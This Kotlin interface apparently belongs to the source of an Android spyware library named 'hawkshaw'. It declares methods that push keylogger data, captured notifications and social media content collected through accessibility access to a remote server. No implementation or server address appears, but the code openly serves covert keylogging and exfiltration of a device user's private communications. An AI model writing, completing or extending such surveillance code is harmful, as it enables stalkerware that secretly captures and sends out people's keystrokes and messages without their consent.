package com.hawkshaw.library.datalayer.network.service

import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsResponse
import com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushNotificationResponse
import com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaResponse
import com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaRequest
import com.hawkshaw.library.datalayer.models.accessibility.PushUnprocessedSocialMediaResponse
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse

/**
 * Service for sending accessibility data to the server
 */
interface AccessibilityService {
    /**
     * Push keylogger data to the server
     */
    suspend fun pushKeyLogs(request: PushKeyLogsRequest): ApiResponse<PushKeyLogsResponse>
    
    /**
     * Push notification data to the server
     */
    suspend fun pushNotifications(request: PushNotificationRequest): ApiResponse<PushNotificationResponse>
    
    /**
     * Push social media data to the server
     */
    suspend fun pushSocialMedia(request: PushSocialMediaRequest): ApiResponse<PushSocialMediaResponse>
    
    /**
     * Push unprocessed social media data to the server
     */
    suspend fun pushUnprocessedSocialMedia(request: PushUnprocessedSocialMediaRequest): ApiResponse<PushUnprocessedSocialMediaResponse>
} 